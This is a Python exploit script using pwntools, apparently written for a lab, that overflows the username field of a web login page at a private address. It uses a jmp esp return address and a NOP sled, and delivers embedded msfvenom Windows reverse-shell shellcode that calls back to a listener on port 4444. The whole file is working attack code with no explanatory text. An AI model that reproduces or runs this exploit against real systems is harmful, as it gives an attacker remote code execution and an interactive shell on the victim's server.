#!/usr/bin/env python3

from pwn import *


pad = b'\x41' * 780
nop = b'\x90' * 32

# 0x10090c83: jmp esp ;
ret = p32(0x10090c83)

# 00 0a 0d 25 26 2b 3d
bad = bytes(i for i in range(1, 256) if i not in b'\x0a\x0d\x25\x26\x2b\x3d')

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -f py LHOST=192.168.122.231 LPORT=4444
buf =  b""
buf += b"\xb8\xab\xa4\xc0\xba\xdb\xc0\xd9\x74\x24\xf4\x5d\x31"
buf += b"\xc9\xb1\x52\x83\xed\xfc\x31\x45\x0e\x03\xee\xaa\x22"
buf += b"\x4f\x0c\x5a\x20\xb0\xec\x9b\x45\x38\x09\xaa\x45\x5e"
buf += b"\x5a\x9d\x75\x14\x0e\x12\xfd\x78\xba\xa1\x73\x55\xcd"
buf += b"\x02\x39\x83\xe0\x93\x12\xf7\x63\x10\x69\x24\x43\x29"
buf += b"\xa2\x39\x82\x6e\xdf\xb0\xd6\x27\xab\x67\xc6\x4c\xe1"
buf += b"\xbb\x6d\x1e\xe7\xbb\x92\xd7\x06\xed\x05\x63\x51\x2d"
buf += b"\xa4\xa0\xe9\x64\xbe\xa5\xd4\x3f\x35\x1d\xa2\xc1\x9f"
buf += b"\x6f\x4b\x6d\xde\x5f\xbe\x6f\x27\x67\x21\x1a\x51\x9b"
buf += b"\xdc\x1d\xa6\xe1\x3a\xab\x3c\x41\xc8\x0b\x98\x73\x1d"
buf += b"\xcd\x6b\x7f\xea\x99\x33\x9c\xed\x4e\x48\x98\x66\x71"
buf += b"\x9e\x28\x3c\x56\x3a\x70\xe6\xf7\x1b\xdc\x49\x07\x7b"
buf += b"\xbf\x36\xad\xf0\x52\x22\xdc\x5b\x3b\x87\xed\x63\xbb"
buf += b"\x8f\x66\x10\x89\x10\xdd\xbe\xa1\xd9\xfb\x39\xc5\xf3"
buf += b"\xbc\xd5\x38\xfc\xbc\xfc\xfe\xa8\xec\x96\xd7\xd0\x66"
buf += b"\x66\xd7\x04\x28\x36\x77\xf7\x89\xe6\x37\xa7\x61\xec"
buf += b"\xb7\x98\x92\x0f\x12\xb1\x39\xea\xf5\x7e\x15\x8e\xe2"
buf += b"\x17\x64\x6e\xfc\xbb\xe1\x88\x94\x53\xa4\x03\x01\xcd"
buf += b"\xed\xdf\xb0\x12\x38\x9a\xf3\x99\xcf\x5b\xbd\x69\xa5"
buf += b"\x4f\x2a\x9a\xf0\x2d\xfd\xa5\x2e\x59\x61\x37\xb5\x99"
buf += b"\xec\x24\x62\xce\xb9\x9b\x7b\x9a\x57\x85\xd5\xb8\xa5"
buf += b"\x53\x1d\x78\x72\xa0\xa0\x81\xf7\x9c\x86\x91\xc1\x1d"
buf += b"\x83\xc5\x9d\x4b\x5d\xb3\x5b\x22\x2f\x6d\x32\x99\xf9"
buf += b"\xf9\xc3\xd1\x39\x7f\xcc\x3f\xcc\x9f\x7d\x96\x89\xa0"
buf += b"\xb2\x7e\x1e\xd9\xae\x1e\xe1\x30\x6b\x2e\xa8\x18\xda"
buf += b"\xa7\x75\xc9\x5e\xaa\x85\x24\x9c\xd3\x05\xcc\x5d\x20"
buf += b"\x15\xa5\x58\x6c\x91\x56\x11\xfd\x74\x58\x86\xfe\x5c"

payload = b'username=' + pad + ret + nop + buf + b'&password=A'

request = b'''POST /login HTTP/1.1
Host: 192.168.122.191
Accept: */*
Referer: http://192.168.122.191/login
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

'''

request = request % len(payload)
request = request.replace(b'\n', b'\r\n')
request += payload

with remote('192.168.122.191', 80) as r:
    r.write(request)
    r.wait()

